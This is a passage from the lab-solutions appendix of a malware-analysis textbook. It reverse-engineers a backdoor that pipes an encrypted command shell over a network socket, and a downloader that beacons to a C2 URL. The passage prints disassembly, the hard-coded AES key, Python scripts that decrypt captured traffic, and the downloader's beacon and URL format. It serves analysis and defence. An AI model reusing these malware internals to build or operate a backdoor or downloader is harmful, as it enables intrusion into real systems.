- en: The PEiD KANAL plug-in reveals AES constants in a similar location.
  prefs: []
  type: TYPE_NORMAL
- en: Listing 13-10L shows the output of the PEiD tool. PEiD’s identification of S
  prefs: []
  type: TYPE_NORMAL
- en: and S-inv refer to the S-box structures that are a basic component of some cryptographic
    algorithms.
  prefs: []
  type: TYPE_NORMAL
- en: 'RIJNDAEL [S] [char] :: 0000C908 :: 0040C908'
  prefs: []
  type: TYPE_NORMAL
- en: 'RIJNDAEL [S-inv] [char] :: 0000CA08 :: 0040CA08'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-10L: PEiD KANAL output*'
  prefs: []
  type: TYPE_NORMAL
- en: Finally, the IDA Entropy Plugin shows areas of high entropy. First, an examination
    of regions of high 8-bit entropy (256-bit chunk size with a minimum entropy value
    of 7.9) highlights the area between 0x0040C900
  prefs: []
  type: TYPE_NORMAL
- en: and 0x0040CB00—the same area previously identified as S-box regions.
  prefs: []
  type: TYPE_NORMAL
- en: Looking at regions of high 6-bit entropy (64-bit chunk size with a minimum entropy
    value of 5.95), we also find an area within the .data section between 0x004120A3
    and 0x004120A7, as shown in Figure 13-5L.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**619**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 138](index-653_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 139](index-653_2.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 13-5L: IDA Entropy Plugin high 6-bit*'
  prefs: []
  type: TYPE_NORMAL
- en: '*entropy findings*'
  prefs: []
  type: TYPE_NORMAL
- en: 'Looking at the high entropy areas shown in Figure 13-5L, we see a string starting
    at 0x004120A4 that contains all 64 Base64 characters: CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/'
  prefs: []
  type: TYPE_NORMAL
- en: Notice that this is not the standard Base64 string, because the capital AB
  prefs: []
  type: TYPE_NORMAL
- en: and the lowercase ab have been moved to the back of their uppercase or lowercase
    sections. This malware may use a custom Base64-encoding algorithm.
  prefs: []
  type: TYPE_NORMAL
- en: Let’s review the relationship between the XOR-related functions we identified
    and other information we have collected. From the location of the Rijndael constants
    we’ve identified, it is clear that the s_xor2 and s_xor4 functions are related
    to AES encryption, and that the s_xor3 and s_xor5 functions are related to AES
    decryption.
  prefs: []
  type: TYPE_NORMAL
- en: The code inside the s_xor6 function is shown in Figure 13-6L.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 13-6L: XOR encoding loop in s_xor6*'
  prefs: []
  type: TYPE_NORMAL
- en: '**620**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 140](index-654_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 141](index-654_2.png)'
  prefs: []
  type: TYPE_IMG
- en: The loop in Figure 13-6L contains the xor instruction at  that shows that s_xor6
    is being used for XOR encoding. The variable arg_0 is a pointer to a source buffer
    that is being transformed, and arg_4 points to the buffer providing the XOR material.
    As the loop is followed, pointers to the two buffers (arg_0 and arg_4), as well
    as the counter var_4, are updated as shown by the three references at .
  prefs: []
  type: TYPE_NORMAL
- en: To determine if s_xor6 is related to the other encoding functions, we examine
    its cross-references. The function that calls s_xor6 starts at 0x0040352D. Figure
    13-7L shows a graph of the function cross-references from 0x0040352D.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 13-7L: Relationship of encryption functions*'
  prefs: []
  type: TYPE_NORMAL
- en: From this graph, we see that s_xor6 is indeed related to the other AES
  prefs: []
  type: TYPE_NORMAL
- en: encryption functions s_xor2 and s_xor4\.
  prefs: []
  type: TYPE_NORMAL
- en: Although we have evidence that s_xor3 and s_xor5 are related to AES
  prefs: []
  type: TYPE_NORMAL
- en: '**1 3**'
  prefs: []
  type: TYPE_NORMAL
- en: decryption, the relationship of these two functions to other functions is less
    clear. For example, when we look for the cross-reference to s_xor5, we see that
    the two locations from which s_xor5 is called (0x004037EE and 0x0040392D) appear
    to contain valid code, but the area is not defined as a function. This suggests
    that while AES code was linked to the malware, decryption is not used, and thus
    the decryption routines show up initially as dead code.
  prefs: []
  type: TYPE_NORMAL
- en: Having identified the function from which s_xor5 is called (0x00403745) as a
    decryption function, we re-create a graph that shows all of the functions called
    from 0x00403745 (which we rename s_AES_decrypt) and 0x0040352D
  prefs: []
  type: TYPE_NORMAL
- en: (which we rename s_AES_encrypt), as shown in Figure 13-8L.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 13-8L: Relationship of XOR functions to AES*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**621**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: This graph shows more clearly the relationship among all of the AES
  prefs: []
  type: TYPE_NORMAL
- en: functions, and in it we can see that all XOR functions other than s_xor1 are
    related to the AES implementation.
  prefs: []
  type: TYPE_NORMAL
- en: Looking at s_xor1, we see several early branches in the code that occur when
    the arguments are incorrect, and luckily the malware still has the error messages
    present. These error messages include Empty key, Incorrect key length, and Incorrect
    block length, implying that this is the key initialization code.
  prefs: []
  type: TYPE_NORMAL
- en: To confirm that we’ve identified the key initialization code, we can try to
    find a connection between this function and the previously identified AES functions.
    Looking at the calling function for s_xor1, we see that just before s_xor1 is
    called, there is a reference to unk_412EF8\. This offset is passed to the s_xor1
    function using ECX. Looking at other references to unk_412EF8, we find that 0x401429
    is one of the places that the offset of unk_412EF8 is loaded into ECX, just before
    the call to s_AES_encrypt. The address unk_412EF8
  prefs: []
  type: TYPE_NORMAL
- en: must be a C++ object representing the AES encryptor, and s_xor1 is the initialization
    function for that encryptor.
  prefs: []
  type: TYPE_NORMAL
- en: Looking back at s_xor1, we see that the Empty key message is issued after a
    test of the arg_0 parameter. From this, we can assume that the arg_0 parameter
    is the key. Looking at the parameter setup in main near the call to s_xor1
  prefs: []
  type: TYPE_NORMAL
- en: (at 0x401895), we can associate arg_0 with the string ijklmnopqrstuvwx, which
    is pushed on the stack. This string is the key used for AES in this malware.
  prefs: []
  type: TYPE_NORMAL
- en: 'Here’s a review of what we know about how AES is used in this malware:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: s_AES_encrypt is used in the function at 0x0040132B. The encryption occurs between
    a call to ReadFile and a call to WriteFile.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: s_xor1 is the AES initialization function that occurs once at the start of the
    process.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: s_xor1 sets the AES password as ijklmnopqrstuvwx.
  prefs: []
  type: TYPE_NORMAL
- en: In addition to AES, we identified the possible use of a custom Base64
  prefs: []
  type: TYPE_NORMAL
- en: cipher with the use of the IDA Entropy Plugin (indicated in Figure 13-5L).
  prefs: []
  type: TYPE_NORMAL
- en: Examining the references to the string CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijkl
    mnopqrstuvwxyzab0123456789+/, we learn that this string is in the function at
    0x0040103F. This function does the indexed lookup into the string, and the calling
    function (at 0x00401082) divides the string to be decoded into 4-byte chunks.
    The function at 0x00401082 then is the custom Base64 decode function, and we can
    see in the function that calls it (0x0040147C) that the decode function lies in
    between a ReadFile and a WriteFile. This is the same pattern we saw for the use
    of AES, but in a different function.
  prefs: []
  type: TYPE_NORMAL
- en: Before we can decrypt content, we need to determine the connection between the
    content and encoding algorithm. As we know, the AES encryption function is used
    by the function starting at 0x0040132B. Looking at the function that calls the
    function at 0x0040132B in Listing 13-11L, we see that 0x0040132B is the start
    of a new thread created with the CreateThread shown at , so we rename 0x0040132B
    to aes_thread.
  prefs: []
  type: TYPE_NORMAL
- en: '**622**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00401823 mov eax, [ebp+var_18]
  prefs: []
  type: TYPE_NORMAL
- en: 00401826 mov [ebp+var_58], eax 
  prefs: []
  type: TYPE_NORMAL
- en: 00401829 mov ecx, [ebp+arg_10]
  prefs: []
  type: TYPE_NORMAL
- en: 0040182C mov [ebp+var_54], ecx 
  prefs: []
  type: TYPE_NORMAL
- en: 0040182F mov edx, dword_41336C
  prefs: []
  type: TYPE_NORMAL
- en: 00401835 mov [ebp+var_50], edx 
  prefs: []
  type: TYPE_NORMAL
- en: 00401838 lea eax, [ebp+var_3C]
  prefs: []
  type: TYPE_NORMAL
- en: 0040183B push eax ; lpThreadId 0040183C push 0 ; dwCreationFlags 0040183E lea
    ecx, [ebp+var_58]
  prefs: []
  type: TYPE_NORMAL
- en: 00401841 push ecx ; lpParameter 00401842 push offset aes_thread ; lpStartAddress
    00401847 push 0 ; dwStackSize 00401849 push 0 ; lpThreadAttributes 0040184B call
    ds:CreateThread 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-11L: Parameters to CreateThread for aes_thread* The parameters
    to the thread start function are passed as the location of var_58, and we see
    three variables pushed onto the stack relative to var_58 as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: var_18 is moved to var_58 at .
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: arg_10 is moved to var_54 at .
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: dword_41336C is moved to var_50 at .
  prefs: []
  type: TYPE_NORMAL
- en: In aes_thread (0x40132B), we see how the parameters are used. Listing 13-1 3
  prefs: []
  type: TYPE_NORMAL
- en: 12L shows select portions of aes_thread with calls to ReadFile and WriteFile,
    and the origin of the handles passed to those functions.
  prefs: []
  type: TYPE_NORMAL
- en: 0040137A mov eax, [ebp+arg_0]
  prefs: []
  type: TYPE_NORMAL
- en: 0040137D mov [ebp+var_BE0], eax
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 004013A2 mov ecx, [ebp+var_BE0]
  prefs: []
  type: TYPE_NORMAL
- en: 004013A8 mov edx, [ecx]
  prefs: []
  type: TYPE_NORMAL
- en: 004013AA push edx  ; hFile
  prefs: []
  type: TYPE_NORMAL
- en: 004013AB call ds:ReadFile
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 0040144A mov eax, [ebp+var_BE0]
  prefs: []
  type: TYPE_NORMAL
- en: 00401450 mov ecx, [eax+4]
  prefs: []
  type: TYPE_NORMAL
- en: 00401453 push ecx  ; hFile
  prefs: []
  type: TYPE_NORMAL
- en: 00401454 call ds:WriteFile
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-12L: Handles passed to ReadFile and WriteFile in aes_thread* The
    value pushed for ReadFile at  can be mapped back to var_58/var_18, as shown in
    Listing 13-11L at . The value pushed for WriteFile in Listing 13-12L at  can
    be mapped back to var_54/arg_10, as shown in Listing 13-11L'
  prefs: []
  type: TYPE_NORMAL
- en: at .
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**623**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Tracing the handle values back to their origin, we find first that var_58
  prefs: []
  type: TYPE_NORMAL
- en: and var_18 hold a handle to a pipe that is created early in the function at
    0x0040132B, and that this pipe is connected with the output of a command shell.
    The command hSourceHandle is copied to the standard output and standard error
    of the command shell started by the CreateProcess command at 0x0040177B, as shown
    in Listing 13-13L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401748 mov ecx, [ebp+hSourceHandle]
  prefs: []
  type: TYPE_NORMAL
- en: 0040174B mov [ebp+StartupInfo.hStdOutput], ecx 0040174E mov edx, [ebp+hSourceHandle]
  prefs: []
  type: TYPE_NORMAL
- en: '00401751 mov [ebp+StartupInfo.hStdError], edx *Listing 13-13L: Connecting a
    pipe to shell output*'
  prefs: []
  type: TYPE_NORMAL
- en: The other handle used by WriteFile in aes_thread (var_54/arg_10) can be traced
    to the parameter passed in from the _main function (0x00401879)—a networking socket
    created with the connect call.
  prefs: []
  type: TYPE_NORMAL
- en: The aes_thread (0x0040132B) function reads the output of the launched command
    shell and encrypts it before writing it to the network socket.
  prefs: []
  type: TYPE_NORMAL
- en: 'The custom Base64-encoding function (0x00401082) is also used in a function
    (0x0040147C) that is started via its own thread. The tracing of inputs is very
    similar to the tracing of the inputs for the AES thread, with a mirror image conclusion:
    The Base64 thread reads as input the remote socket, and after it decodes the function,
    it sends the result to the input of the command shell.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Modified Base64 Decoding**'
  prefs: []
  type: TYPE_NORMAL
- en: 'Having established the two types of encoding in this malware, let’s try to
    decrypt the content. Beginning with the custom Base64 encoding, we’ll assume that
    part of the captured network communication coming from the remote site is the
    string: BInaEi==. Listing 13-14L shows a custom script for decrypting modified
    Base64 implementations.'
  prefs: []
  type: TYPE_NORMAL
- en: import string
  prefs: []
  type: TYPE_NORMAL
- en: import base64
  prefs: []
  type: TYPE_NORMAL
- en: s = ""
  prefs: []
  type: TYPE_NORMAL
- en: tab = 'CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/'
  prefs: []
  type: TYPE_NORMAL
- en: b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  prefs: []
  type: TYPE_NORMAL
- en: ciphertext = 'BInaEi=='
  prefs: []
  type: TYPE_NORMAL
- en: 'for ch in ciphertext:'
  prefs: []
  type: TYPE_NORMAL
- en: 'if (ch in tab):'
  prefs: []
  type: TYPE_NORMAL
- en: s += b64[string.find(tab,str(ch))]
  prefs: []
  type: TYPE_NORMAL
- en: 'elif (ch == ''=''):'
  prefs: []
  type: TYPE_NORMAL
- en: s += '='
  prefs: []
  type: TYPE_NORMAL
- en: print base64.decodestring(s)
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-14L: Custom Base64 decryption script*'
  prefs: []
  type: TYPE_NORMAL
- en: '**624**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*The code in Listing 13-14L is a generic script that can be repurposed for
    any custom* *Base64 implementation by redefining the tab variable.*'
  prefs: []
  type: TYPE_NORMAL
- en: Using this script, we translate the string to see what command was sent to the
    command shell. The output in Listing 13-15L shows that the attacker is sending
    a request for a directory listing (dir).
  prefs: []
  type: TYPE_NORMAL
- en: $ python custom_b64_decrypt.py
  prefs: []
  type: TYPE_NORMAL
- en: dir
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-15L: Output of custom Base64 decryption script* **Decrypting AES**'
  prefs: []
  type: TYPE_NORMAL
- en: Translating the AES side of the command channel is slightly more challenging.
    For example, say that the malware sends the raw stream content shown in Listing
    13-16L.
  prefs: []
  type: TYPE_NORMAL
- en: 00000000 37 f3 1f 04 51 20 e0 b5 86 ac b6 0f 65 20 89 92 7...Q .. ....e ..
  prefs: []
  type: TYPE_NORMAL
- en: 00000010 4f af 98 a4 c8 76 98 a6 4d d5 51 8f a5 cb 51 c5 O....v.. M.Q...Q.
  prefs: []
  type: TYPE_NORMAL
- en: 00000020 cf 86 11 0d c5 35 38 5c 9c c5 ab 66 78 40 1d df .....58\ ...fx@..
  prefs: []
  type: TYPE_NORMAL
- en: 00000030 4a 53 f0 11 0f 57 6d 4f b7 c9 c8 bf 29 79 2f c1 JS...WmO ....)y/.
  prefs: []
  type: TYPE_NORMAL
- en: 00000040 ec 60 b2 23 00 7b 28 fa 4d c1 7b 81 93 bb ca 9e .`.#.{(. M.{.....
  prefs: []
  type: TYPE_NORMAL
- en: 00000050 bb 27 dd 47 b6 be 0b 0f 66 10 95 17 9e d7 c4 8d .'.G.... f.......
  prefs: []
  type: TYPE_NORMAL
- en: 00000060 ee 11 09 99 20 49 3b df de be 6e ef 6a 12 db bd .... I;. ..n.j...
  prefs: []
  type: TYPE_NORMAL
- en: 00000070 a6 76 b0 22 13 ee a9 38 2d 2f 56 06 78 cb 2f 91 .v."...8 -/V.x./.
  prefs: []
  type: TYPE_NORMAL
- en: 00000080 af 64 af a6 d1 43 f1 f5 47 f6 c2 c8 6f 00 49 39 .d...C.. G...o.I9
  prefs: []
  type: TYPE_NORMAL
- en: '**1 3**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-16L: AES-encrypted network content*'
  prefs: []
  type: TYPE_NORMAL
- en: The PyCrypto library provides convenient cryptographic routines for dealing
    with data like this. Using the code shown in Listing 13-17L, we can decrypt the
    content.
  prefs: []
  type: TYPE_NORMAL
- en: from Crypto.Cipher import AES
  prefs: []
  type: TYPE_NORMAL
- en: import binascii
  prefs: []
  type: TYPE_NORMAL
- en: raw = ' 37 f3 1f 04 51 20 e0 b5 86 ac b6 0f 65 20 89 92 ' + \
  prefs: []
  type: TYPE_NORMAL
- en: ''' 4f af 98 a4 c8 76 98 a6 4d d5 51 8f a5 cb 51 c5 '' + \'
  prefs: []
  type: TYPE_NORMAL
- en: ''' cf 86 11 0d c5 35 38 5c 9c c5 ab 66 78 40 1d df '' + \'
  prefs: []
  type: TYPE_NORMAL
- en: ''' 4a 53 f0 11 0f 57 6d 4f b7 c9 c8 bf 29 79 2f c1 '' + \'
  prefs: []
  type: TYPE_NORMAL
- en: ''' ec 60 b2 23 00 7b 28 fa 4d c1 7b 81 93 bb ca 9e '' + \'
  prefs: []
  type: TYPE_NORMAL
- en: ''' bb 27 dd 47 b6 be 0b 0f 66 10 95 17 9e d7 c4 8d '' + \'
  prefs: []
  type: TYPE_NORMAL
- en: ''' ee 11 09 99 20 49 3b df de be 6e ef 6a 12 db bd '' + \'
  prefs: []
  type: TYPE_NORMAL
- en: ''' a6 76 b0 22 13 ee a9 38 2d 2f 56 06 78 cb 2f 91 '' + \'
  prefs: []
  type: TYPE_NORMAL
- en: ''' af 64 af a6 d1 43 f1 f5 47 f6 c2 c8 6f 00 49 39 '' '
  prefs: []
  type: TYPE_NORMAL
- en: ciphertext = binascii.unhexlify(raw.replace(' ','')) 
  prefs: []
  type: TYPE_NORMAL
- en: obj = AES.new('ijklmnopqrstuvwx', AES.MODE_CBC) 
  prefs: []
  type: TYPE_NORMAL
- en: print 'Plaintext is:\n' + obj.decrypt(ciphertext) 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-17L: AES decryption script*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**625**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The raw variable defined at  contains the raw network content identified in
    Listing 13-16L. The raw.replace function at  removes the spaces from the raw
    string, and the binascii.unhexlify function turns the hex representation into
    a binary string. The AES.new call at  creates a new AES object with the appropriate
    password and mode of operation, which allows for the following decrypt call at
    .
  prefs: []
  type: TYPE_NORMAL
- en: The output of the AES script is shown in Listing 13-18L. Note that this captured
    content was simply a command prompt.
  prefs: []
  type: TYPE_NORMAL
- en: $ python aes_decrypt.py
  prefs: []
  type: TYPE_NORMAL
- en: 'Plaintext is:'
  prefs: []
  type: TYPE_NORMAL
- en: Microsoft Windows XP [Version 5.1.2600]
  prefs: []
  type: TYPE_NORMAL
- en: (C) Copyright 1985-2001 Microsoft Corp.
  prefs: []
  type: TYPE_NORMAL
- en: C:\Documents and Settings\user\Desktop\13_3_demo>
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-18L: AES decryption script output*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Crypto Pitfalls**'
  prefs: []
  type: TYPE_NORMAL
- en: 'The default use of the PyCrypto library routines worked successfully in Lab
    13-3, but there are many potential pitfalls when trying to implement decryption
    routines directly, including the following:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Block cryptography algorithms have many possible modes of operation, such as
    Electronic Code Book (ECB), Cipher Block Chaining (CBC), and Cipher Feedback (CFB).
    Each mode requires a different set of steps between the encoding or decoding of
    each block, and some require an initialization vector in addition to a password.
    If you don’t match the implementation used, decryption may work only partially
    or not at all.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: In this lab, the key was provided directly. A given implementation may have
    its own technique for generating a key given a user-provided or string-based password.
    In such cases, the key-generation algorithm will need to be identified and duplicated
    separately.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Within a standard algorithm, there may be options that must be specified correctly.
    For example, a single encryption algorithm may allow multiple key sizes, block
    sizes, rounds of encryption or decryption, and padding strategies.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 14-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The program contains the URLDownloadToCacheFile function, which uses the COM
    interface. When malware uses COM interfaces, most of the content of its HTTP requests
    comes from within Windows itself, and therefore cannot be effectively targeted
    using network signatures.
  prefs: []
  type: TYPE_NORMAL
- en: '**626**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The source elements are part of the host’s GUID and the username. The GUID is
    unique for any individual host OS, and the 6-byte portion used in the beacon should
    be relatively unique. The username will change depending on who is logged in to
    the system.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The attacker may want to track the specific hosts running the downloader and
    target specific users.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The Base64 encoding is not standard since it uses an a instead of an equal sign
    (=) for its padding.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: This malware downloads and executes other code.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The elements of the malware communication to be targeted include the domain
    name, the colons and the dash found after Base64 decoding, and the fact that the
    last character of the Base64 portion of the URI is the single character used for
    the filename of the PNG file.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: Defenders may try to target elements other than the URI if they don’t realize
    that the OS determines them. In most cases, the Base64 string ends with an a,
    which usually makes the filename appear as *a.png*. However, if the username length
    is an even multiple of three, both the final character and the filename will depend
    on the last character in the encoded username. In this case, the filename is unpredictable.
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: See the detailed analysis for recommended signatures.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Because there is no packet capture associated with this malware, we’ll use dynamic
    analysis to help us to understand its function. Running the malware, we see a
    beacon like the one shown in Listing 14-1L.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 4**'
  prefs: []
  type: TYPE_NORMAL
- en: GET /NDE6NzM6N0U6Mjk6OTM6NTYtSm9obiBTbWl0aAaa/a.png HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 'Accept: */*'
  prefs: []
  type: TYPE_NORMAL
- en: 'UA-CPU: x86'
  prefs: []
  type: TYPE_NORMAL
- en: 'Accept-Encoding: gzip, deflate'
  prefs: []
  type: TYPE_NORMAL
- en: 'User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR'
  prefs: []
  type: TYPE_NORMAL
- en: '2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
    Host: www.practicalmalwareanalysis.com'
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection: Keep-Alive'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 14-1L: Beacon request from initial malware run* **NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*If you have trouble seeing the beacon, make sure that your DNS requests are
    redirected to* *an internal host and that you have a program such as Netcat or
    INetSim accepting* *inbound connections to port 80\.*'
  prefs: []
  type: TYPE_NORMAL
- en: Examining this single beacon alone, it is difficult to tell which components
    might be hard-coded. If you were to try running the malware multiple times, you
    would find that it uses the same beacon each time. If you have another host available,
    and you try to run the malware on it, you may get something like the result shown
    in Listing 14-2L.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**627**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: GET /OTY6MDA6QTI6NDY6OTg6OTItdXNlcgaa/a.png HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 'Accept: */*'
  prefs: []
  type: TYPE_NORMAL
- en: 'Accept-Encoding: gzip, deflate'
  prefs: []
  type: TYPE_NORMAL
- en: 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR'
  prefs: []
  type: TYPE_NORMAL
- en: '2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)
    Host: www.practicalmalwareanalysis.com'
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection: Keep-Alive'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 14-2L: Beacon request from second malware run using different host*
    From this second example, it should be clear that the User-Agent is either not
    hard-coded or the malware can choose from multiple User-Agent strings. In fact,
    a quick test using Internet Explorer from our second host finds that regular browser
    activity matches the User-Agent seen in the beacon, indicating that this malware
    very likely is using the COM API. Comparing the URIs, you can see that the aa/a.png
    appears to be a consistent string.'
  prefs: []
  type: TYPE_NORMAL
- en: Moving on to static analysis, we load the malware in IDA Pro to identify the
    networking functions. Looking at the imports, it is clear that the function used
    to beacon out is URLDownloadToCacheFileA. The use of the COM API agrees with dynamic
    testing that showed different hosts generating different User-Agent strings, each
    of which also matched the Internet Explorer User-Agent strings.
  prefs: []
  type: TYPE_NORMAL
- en: 'Since URLDownloadToCacheFileA appears to be the only networking function used,
    we will continue analysis at the function containing it at 0x004011A3\. One quick
    observation is that this function contains calls to both URLDownloadToCacheFileA
    and CreateProcessA. Because of this, we’ll rename the function downloadNRun in
    IDA Pro. Within downloadNRun, notice that just prior to the URLDownloadToCacheFileA
    function, the following string is referenced:'
  prefs: []
  type: TYPE_NORMAL
- en: http://www.practicalmalwareanalysis.com/%s/%c.png
  prefs: []
  type: TYPE_NORMAL
- en: This string is used as the input for a call to sprintf, whose output is used
    as a parameter to URLDownloadToCacheFileA. We see from this format string that
    the filename for the PNG file is always a single character defined by %c and that
    the middle segment of the URI is defined by %s. To determine how the beacon is
    generated, we trace backward to find the origin of the inputs to the
  prefs: []
  type: TYPE_NORMAL
- en: '%s and %c parameters with the annotated output shown in the comments in Listing
    14-3L.'
  prefs: []
  type: TYPE_NORMAL
- en: 004011AC mov eax, [ebp+Str] ; Str passed as an argument 004011AF push eax ;
    Str
  prefs: []
  type: TYPE_NORMAL
- en: 004011B0 call _strlen
  prefs: []
  type: TYPE_NORMAL
- en: 004011B5 add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: 004011B8 mov [ebp+var_218], eax ; var_218 contains the size of the string 004011BE
    mov ecx, [ebp+Str]
  prefs: []
  type: TYPE_NORMAL
- en: 004011C1 add ecx, [ebp+var_218] ; ecx points to the end of the string 004011C7
    mov dl, [ecx-1] ; dl gets the last character of the string 004011CA mov [ebp+var_214],
    dl ; var_214 contains the last character of the string **628**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 142](index-662_1.png)'
  prefs: []
  type: TYPE_IMG
- en: 004011D0 movsx eax, [ebp+var_214] ; eax contains the last character of the string
    004011D7 push eax ; the %c argument contains the last character of the string
    004011D8 mov ecx, [ebp+Str]
  prefs: []
  type: TYPE_NORMAL
- en: '004011DB push ecx ; the %s argument contains the string Str *Listing 14-3L:
    Annotated code for the sprintf arguments* The code in Listing 14-3L is preparing
    arguments %s and %c to be passed into the sprintf function. The line at 0x004011D7
    is pushing the %c argument onto the stack, and the line at 0x004011DB is pushing
    the %s argument onto the stack.'
  prefs: []
  type: TYPE_NORMAL
- en: The earlier code (0x004011AC–0x004011CA) represents the copying of the last
    character of %s into %c. First, strlen is used to calculate the end of the string
    (0x004011AC–0x004011B8). Then the last character of %s is copied to a local variable
    var_214 used for %c (0x004011BE–0x004011CA). Thus, in the final URI, the filename
    %c is always the last character of the string %s. This explains why the filename
    in both examples is *a*, since it matches the last character.
  prefs: []
  type: TYPE_NORMAL
